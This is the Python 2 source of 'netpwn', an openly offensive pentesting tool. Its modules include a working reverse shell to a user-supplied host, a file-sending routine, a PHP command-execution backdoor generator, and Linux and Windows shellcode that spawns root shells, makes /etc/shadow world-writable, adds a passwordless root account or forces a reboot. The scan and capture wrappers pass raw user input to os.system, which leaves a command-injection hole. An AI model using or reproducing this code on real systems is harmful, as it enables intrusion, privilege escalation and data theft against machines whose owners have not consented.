"""netpwn pentesting tool"""
# !/usr/bin/python
# Created by 3XPL017
# Member of @togetherwehack
# Install packet_capture, iftop, netdiscover and nmap for full functionality

from urllib2 import urlopen
import fcntl
import struct
import base64
import readline
import os
import sys
import socket
import subprocess
from termcolor import colored
import netifaces

OPTIONS_SL = [
    'reverse_shell',
    'packet_capture',
    'port_scan',
    'send_file',
    'web_web_backdoor',
    'network_conns',
    'hash_check',
    'base64_converter',
    'discovery',
    'address_info',
    'generate_shellcode',
    'hex_converter',
    'modules'
    ]

TABCOMP = OPTIONS_SL


def completer(text, state):
    """Tab complete"""
    options = [x for x in TABCOMP if x.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")


def banner():
    """Displays the netpwn banner"""
    print colored(r'               __                       ', 'blue')
    print colored(r'  ____   _____/  |_________  _  ______  ', 'blue')
    print colored(r' /    \_/ __ \   __\____ \ \/ \/ /    \ ', 'blue')
    print colored(r'|   |  \  ___/|  | |  |_> >     /   |  \ ', 'blue')
    print colored(r'|___|  /\___  >__| |   __/ \/\_/|___|  /', 'blue')
    print colored(r'     \/     \/     |__|              \/ ', 'blue')
    print ' '
    print colored(r'     | Created by 3XPL017         |', 'blue')
    print colored(r'     | twitter: @3XPL017GH057     |', 'blue')
    print colored(r'     | https://github.com/3XPL017 |', 'blue')
    print ' '
    print colored(r'     Type [show modules] to show modules', 'green')
    print colored(r'     Type [run <name of module>] to run it', 'green')
    print colored(r'     Type [exit] or [quit] to quit', 'green')
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '


def check_root():
    """Checks for root privileges"""
    if not os.geteuid() == 0:
        sys.exit('netpwn must be run as root')


def reverse_shell():
    """Creates a reverse shell using /bin/sh"""
    try:
        print colored('Enter the IP to connect to', 'green')
        tgt_host = raw_input(colored('reverse_shell>', 'red'))
        print colored('Enter the port to connect to', 'green')
        tgt_port = int(raw_input(colored('reverse_shell>', 'red')))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((tgt_host, tgt_port))
        os.dup2(sock.fileno(), 0)
        os.dup2(sock.fileno(), 1)
        os.dup2(sock.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])

    except socket.error:
        print colored('Could not connect to host', 'yellow')

    except ValueError:
        print colored('Not a valid IP or port', 'yellow')


def packet_capture():
    """Starts tcpdump"""
    print colored('Enter inteface to capture on', 'green')
    interface = raw_input(colored('packet_capture>', 'red'))
    print colored('Outputting to capture.pcap', 'green')
    os.system('tcpdump -i' + interface + ' -w capture.pcap')


def port_scan():
    """Uses nmap to port scan"""
    print colored('Enter IP or IP range to scan', 'green')
    target = raw_input(colored('port_scan>', 'red'))
    print colored('Outputting to file port_scan.txt', 'green')
    os.system('nmap -sC -sV ' + target + '> port_scan.txt')


def send_file():
    """Sends file to remote location"""
    try:
        print colored('Enter the IP to send file to', 'green')
        address = raw_input(colored('send_file>', 'red'))
        print colored('Enter the port to send file to', 'green')
        port = int(raw_input(colored('send_file>', 'red')))
        print colored('Enter directory of file to send', 'green')
        input_file = raw_input(colored('send_file>', 'red'))
        open_file = open(input_file)
        send = open_file.read()
        transfer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        transfer.connect((address, port))
        transfer.send(send)

    except ValueError as error:
        print colored('Could not send file to ' + str(error), 'yellow')

    except IOError as error:
        print colored('Could not find ' + str(error), 'yellow')


def web_backdoor():
    """Creates a backdoor in php"""
    print colored('Creating php backdoor in your current directory', 'green')
    print colored('Usage: http://<localIP>/backdoor.php?cmd=', 'green')
    code = "<html> <?php system($_GET['cmd']);?> </html>"
    os.system('touch backdoor.php')
    backdoor = open('backdoor.php', 'w')
    backdoor.write(code)
    backdoor.close()


def network_conns():
    """Uses iftop to show connections"""
    print colored('Enter interface', 'green')
    interface = raw_input(colored('network_conns>', 'red'))
    os.system('iftop -i ' + interface)


def hash_check():
    """Detects input hash type"""
    print colored('Enter a hash to determine its type', 'green')
    input_hash = raw_input(colored('hash_check>', 'red'))

    if len(input_hash) == 32:
        print colored('Hash type: md5', 'green')
    elif len(input_hash) == 40:
        print colored('Hash type: sha1', 'green')
    elif len(input_hash) == 64:
        print colored('Hash type: sha256', 'green')
    elif len(input_hash) == 128:
        print colored('Hash type: sha512', 'green')
    else:
        print colored('No hash type found', 'green')


def base64_converter():
    """Converts to and from base64"""
    print colored('Enter some text to encode or decode as base64', 'green')
    print colored('This will automatically try to encode or decode', 'green')

    input_str = raw_input(colored('base64_converter>', 'red'))

    try:
        output = base64.b64decode(input_str)
        output.encode('ascii')

    except ValueError:
        output = base64.b64encode(input_str)

    print colored(output, 'green')


def address_info():
    """Gets networking information"""
    print colored('Enter interface', 'green')

    try:
        interface = raw_input(colored('address_info>', 'red'))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        val = struct.pack('256s', interface[:15])
        info = fcntl.ioctl(sock.fileno(), 0x8927, val)
        joining = ['%02x' % ord(char) for char in info[18:24]]
        print colored('Your MAC is: ' + ':'.join(joining), 'green')

    except IOError as error:
        print colored('Invalid interface' + str(error), 'yellow')

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(("8.8.8.8", 80))
    print colored('Your local IP is: ' + (sock.getsockname()[0]), 'green')
    sock.close()

    my_gateway = netifaces.gateways()
    getgateway = my_gateway['default'][socket.AF_INET][0]
    print colored('Your default gateway is: ' + getgateway, 'green')

    my_ip = urlopen('http://ip.42.pl/raw').read()
    print colored('Your public IP is: ' + my_ip, 'green')


def generate_shellcode():
    """Generates shellcode of linux"""
    print colored('Enter target operating system', 'green')
    platform = raw_input(colored('generate_shellcode>', 'red'))

    if platform == 'linux':
        print colored('Enter target architechure', 'green')
        arch = raw_input(colored('generate_shellcode>', 'red'))

        if arch == 'x86':
            print colored('Execute /bin/sh:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f'
                '\\x62\\x69\\x6e\\x89\\xe3\\x89'
                '\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80',
                'green')
            print ' '
            print colored('Chmod 777 /etc/shadow:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\xb0\\x0f\\x68\\x61\\x64\\x6f\\x77'
                '\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f'
                '\\x2f\\x65\\x74\\x89\\xe3\\x31\\xc9\\x66\\xb9\\xff\\x01\\xcd'
                '\\x80\\x40\\xcd\\x80',
                'green')
            print ' '
            print colored('Create root user r00t with no password:', 'green')
            print colored(
                '\\x6a\\x05\\x58\\x31\\xc9\\x51\\x68\\x73\\x73\\x77'
                '\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74'
                '\\x63\\x89\\xe3\\x66'
                '\\xb9\\x01\\x04\\xcd\\x80\\x89\\xc3\\x6a\\x04\\x58\\x31\\xd2'
                '\\x52\\x68\\x30\\x3a\\x3a\\x3a\\x68\\x3a\\x3a\\x30\\x3a\\x68'
                '\\x72\\x30\\x30\\x74\\x89\\xe1\\x6a\\x0c\\x5a\\xcd\\x80\\x6a'
                '\\x06\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80',
                'green')
            print ' '
            print colored('Forced reboot:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\x68\\x62\\x6f\\x6f\\x74\\x68\\x6e'
                '\\x2f\\x72\\x65\\x68\\x2f\\x73\\x62'
                '\\x69\\x89\\xe3\\x50\\x66\\x68\\x2d\\x66\\x89\\xe6\\x50\\x56'
                '\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80',
                'green')

        elif arch == 'x64':
            print colored('Execute /bin/sh and setuid(0):', 'green')
            print colored(
                '\\x48\\x31\\xff\\xb0\\x69\\x0f\\x05\\x48\\x31\\xd2'
                '\\x48\\xbb\\xff\\x2f\\x62\\x69'
                '\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7'
                '\\x48\\x31\\xc0\\x50\\x57\\x48'
                '\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58'
                '\\x0f\\x05',
                'green')
            print ' '
            print colored('Power off', 'green')
            print colored(
                '\\xba\\xdc\\xfe\\x21\\x43\\xbe\\x69\\x19\\x12'
                '\\x28\\xbf\\xad\\xde\\xe1\\xfe'
                '\\xb0\\xa9\\x0f\\x05',
                'green')

        else:
            print colored('Not a valid architecture', 'yellow')

    elif platform == 'mac':
        print colored('HAHA no', 'yellow')

    elif platform == 'windows':
        print colored('Lol windows... seriously...fine', 'yellow')
        print colored(
            'I would ask you for the architecture but I do not '
            'care very much so here try this it might'
            ' work on some windows xp version but i doubt it can be very '
            'useful unless you need to do some math...',
            'green')
        print colored(
            '\\xeb\\x1b\\x5b\\x31\\xc0\\x50\\x31\\xc0\\x88\\x43'
            '\\x13\\x53\\xbb\\xad\\x23\\x86\\x7c'
            '\\xff\\xd3\\x31\\xc0\\x50\\xbb\\xfa\\xca\\x81\\x7c\\xff\\xd3'
            '\\xe8\\xe0\\xff\\xff\\xff'
            '\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\x63'
            '\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65',
            'green')
        print ' '
        print colored(
            'Instead of trying to run your shellcode on a windows '
            'box perhaps leave a note for the admin telling'
            ' them about this cool thing called linux',
            'green')

    else:
        print colored('Not a valid option try typing linux', 'yellow')


def hex_converter():
    """Converts to and from hexadecimal"""
    print colored('This converts hex to ascii and ascii to hex')
    input_str = raw_input(colored('hex_converter>', 'red'))
    decoded = input_str
    encoded = input_str

    try:
        if any(i in decoded for i in '0x'):
            decoded = decoded.replace('0x', '')
        if any(i in decoded for i in '\\x'):
            decoded = decoded.replace('\\x', '')

        decoded = decoded.decode('hex')
        print colored('Decoded as: ' + decoded, 'green')

    except TypeError:
        print colored('No hex value was given to decode', 'yellow')

    encoded = encoded.encode('hex')
    print colored('Encoded as: ' + '0x' + encoded)


def modules():
    """Prints available modules"""
    print colored('reverse_shell', 'green')
    print colored('packet_capture', 'green')
    print colored('port_scan', 'green')
    print colored('send_file', 'green')
    print colored('web_backdoor', 'green')
    print colored('network_conns', 'green')
    print colored('hash_check', 'green')
    print colored('base64_converter', 'green')
    print colored('discovery', 'green')
    print colored('address_info', 'green')
    print colored('generate_shellcode', 'green')
    print colored('hex_converter', 'green')


def main():
    """Handles which function to run"""
    choice = raw_input(colored('netpwn>', 'red'))

    options = {
        'run reverse_shell': lambda: reverse_shell(),
        'run packet_capture': lambda: packet_capture(),
        'run port_scan': lambda: port_scan(),
        'run send_file': lambda: send_file(),
        'run web_backdoor': lambda: web_backdoor(),
        'run network_conns': lambda: network_conns(),
        'run hash_check': lambda: hash_check(),
        'run base64_converter': lambda: base64_converter(),
        'run discovery': lambda: os.system('netdiscover'),
        'run address_info': lambda: address_info(),
        'run generate_shellcode': lambda: generate_shellcode(),
        'run hex_converter': lambda: hex_converter(),
        'show modules': lambda: modules(),
        'clear': lambda: os.system('clear'),
        'banner': lambda: banner(),
        'exit': lambda: exit(0),
        'quit': lambda: exit(0),
        '': lambda: 1 + 1,
    }
    options.get(choice, lambda: None)()

    main()

if __name__ == '__main__':
    check_root()
    banner()
    main()
